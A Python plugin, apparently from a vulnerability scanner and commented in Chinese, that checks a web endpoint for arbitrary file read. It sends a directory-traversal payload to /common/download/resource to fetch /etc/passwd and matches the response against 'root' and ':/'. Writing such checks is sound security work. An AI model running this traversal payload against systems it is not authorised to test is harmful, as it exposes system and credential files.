# 任意文件读取：通过 /common/download/resource 接口读取 /etc/passwd
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_all


class FileReadPlugin(PluginBase):
    name = '任意文件读取'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '通过 /common/download/resource 的 resource 参数目录穿越读取 /etc/passwd'
    fix = '限制 resource 参数路径，禁止 .. 目录穿越，下载接口强制鉴权'

    def verify(self, target, session):
        # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
        url = join_url(target, '/common/download/resource?resource=/profile/../../../../../../../etc/passwd')
        try:
            file_read_use = session.get(url).text
        except Exception as e:
            print(no('任意文件读取（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))
        # 判定 1:1 保留：'root' 与 ':/' 同时出现（AND 联合，过滤仅含 root 的噪声）
        # 使用 match_all 统一降误报工具（agents.md §5）
        if match_all(file_read_use, ['root', ':/']):
            print(ok('存在任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, severity=self.severity,
                              status=STATUS_CONFIRMED, url=url,
                              evidence='响应含 root 与 :/ 特征（/etc/passwd）', fix=self.fix)
        else:
            print(no('不存在任意文件读取漏洞'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url)
